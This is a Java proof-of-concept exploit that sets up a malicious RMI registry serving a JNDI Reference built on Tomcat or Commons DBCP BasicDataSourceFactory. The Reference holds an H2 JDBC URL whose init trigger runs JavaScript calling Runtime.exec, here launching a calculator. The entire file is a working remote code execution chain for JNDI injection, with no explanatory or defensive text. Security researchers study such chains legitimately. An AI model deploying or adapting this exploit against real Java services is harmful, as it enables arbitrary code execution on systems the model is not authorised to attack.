package xyz.eki.marshalexp.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class AttackWithTomcatBasicDataSourceFactory {
    public static void main(String[] args) throws RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = tomcat_dbcp2_RCE();
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.rebind("Foo", wrapper);
    }

    private static Reference tomcat_dbcp2_RCE(){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory");
    }
    private static Reference tomcat_dbcp1_RCE(){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp2_RCE(){
        return dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp1_RCE(){
        return dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory");
    }
    private static Reference dbcpByFactory(String factory){
        Reference ref = new Reference("javax.sql.DataSource",factory,null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('mate-calc')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));
        return ref;
    }
}
